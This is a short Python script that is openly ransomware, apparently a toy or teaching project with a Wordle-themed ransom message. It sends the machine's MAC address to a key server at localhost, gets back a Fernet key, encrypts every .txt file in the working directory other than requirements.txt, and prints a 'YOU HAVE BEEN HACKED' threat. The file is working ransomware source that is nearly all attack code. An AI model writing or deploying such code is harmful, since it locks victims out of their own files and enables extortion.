import os
from cryptography.fernet import Fernet
import requests
import uuid
    

def get_mac():                  #get the mac address of the machine
    mac = uuid.getnode()
    mac_address = ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
    return mac_address

def create_symmetric_key(mac_address):          #POST: send the mac address and get the symmetric key from the server
    url = "http://127.0.0.1:8000/symmetric_keys"
    data = {"mac_address": mac_address}
    response = requests.post(url, json=data)
    if response.status_code == 200:
        return response.json()
    else:
        return None

def alert():
    print("‼️⚠️⚠️⚠️ Y0U H@V3 B33N H@CK3D! ⚠️⚠️⚠️")
    print("‼️⚠️⚠️⚠️ Y0U H@V3 B33N H@CK3D! ⚠️⚠️⚠️")
    print("‼️⚠️⚠️⚠️ D0N'T TRY T0 D3CRYPT TH3 F1L3S ⚠️⚠️⚠️")
    print("‼️⚠️⚠️⚠️ 1F N0T, Y0UR F1L3S W1LL B3 3NCRYPT3D F0R3V3R ⚠️⚠️⚠️")
    print("‼️⚠️⚠️⚠️ L3T'S PL@Y W0RDLE T0 G3T TH3 K3Y ⚠️⚠️⚠️")
    print("‼️⚠️⚠️⚠️ Y0U H@V3 6 CH@NC3S T0 GU3SS TH3 W0RD ⚠️⚠️⚠️")

def run():
    alert()
    #check not encrypt 2 times
    if "thekey.key" in os.listdir(os.getcwd()):
        return
    
    mac_address = get_mac()
    data = create_symmetric_key(mac_address)
    id = ""
    key = ""
    if data:
        id = data.get("id").encode("utf-8")
        key = data.get("key").encode("utf-8")
        with open("thekey.key", "wb") as f:
            f.write(id)
    
    files = []

    # search all files in current path
    for file in os.listdir(os.getcwd()):
        if file.endswith('.txt') and file != "requirements.txt":
            files.append(file)

    # encrypt files

    for file in files:
        with open(file, "rb") as f:
            data = f.read()
        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)
        with open(file, "wb") as f:
            f.write(encrypted)

if __name__ == "__main__":
    run()